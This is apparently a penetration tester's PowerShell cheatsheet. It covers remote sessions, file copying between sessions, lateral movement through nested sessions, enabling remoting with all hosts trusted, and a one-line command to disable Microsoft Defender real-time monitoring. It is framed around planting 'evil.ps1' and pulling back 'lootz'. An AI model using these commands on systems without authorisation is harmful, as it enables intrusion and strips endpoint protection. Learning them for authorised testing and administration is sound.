# PowerShell Cheatsheet

## Quick Checks

Check the language mode:

`$ExecutionContext.SessionState.LanguageMode`

Check the version:

`$PSVersionTable.PSVersion`

## Remote PowerShell Sessions

WinRM access is governed by the Remote Management Users group. If we have access, easily checked remotely by probing with CrackMapExec, `Invoke-Command` allows for running remote commands:

`Invoke-Command -ComputerName target -Credential Credential -ScriptBlock {whoami}`

We can also enter an SSH-like session with PowerShell:

`Enter-PSSession -ComputerName target -Credential $Credential`

Sessions can also be set to variables and run in the background:

`$sess = New-PSSession -ComputerName target -Credential $Credential`

### Managing Sessions

Background sessions can be listed with:

`Get-PSSession`

Enter a PS Session with:

`Enter-PSSession -id #`

Removing sessions can be done with:

`Exit-PSSession` in an active session, or

`Get-PSSession | Disconnect-PSSession` to kill all background sessions.

### Copying To and From Sessions

`Copy-Item` facilitates moving files using `-ToSession` and `-FromSession`:

`Copy-Item -ToSession $sess -Path "C:\Users\Administrator\Desktop\" -Destination "C:\Users\Administrator\Desktop\evil.ps1" -Recurse`

`Copy-Item -FromSession $sess -Path "C:\Users\Administrator\Desktop\lootz\" -Destination "C:\Users\Administrator\Desktop\" -Recurse`

You just can't copy from one session to another.

### Nesting PSSessions

We can use PS Remoting to execute commands on a secondary remote machine for lateral movement or moving deeper into a network. 

`Invoke-Command` can be nested to execute a command on Computer A which then executes a command on Computer B.

However, using PSSession for this may lead to certain commands failing due what Microsoft calls the "double hop problem."

https://blogs.msdn.microsoft.com/clustering/2009/06/25/powershell-remoting-and-the-double-hop-problem/

"...will fail because you are trying to make a remote operation from an environment which is already using a remote connection – this is known as the “double-hop” problem."

When a nested PSSession is desired, enable CredSSP to allow delgation of creds on to the next machine.

### Enabling Remoting

First, enable remoting in an administrative PowerShell window:

`Enable-PSRemoting -Force`

Check WinRM:

`Set-Service WinRM -StartMode Automatic`
`Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}`

Trust all (*) hosts so we can use IP addresses instead of hostnames:

`Set-Item WSMan:localhost\client\trustedhosts -value *`

`Get-Item WSMan:\localhost\Client\TrustedHosts`

## Messing with AV

Check age of Defender's AV signatures:

`Get-MpComputerStatus | Select AntivirusSignature*`

Disable Defender:

`Set-MpPreference -DisableRealtimeMonitoring $true`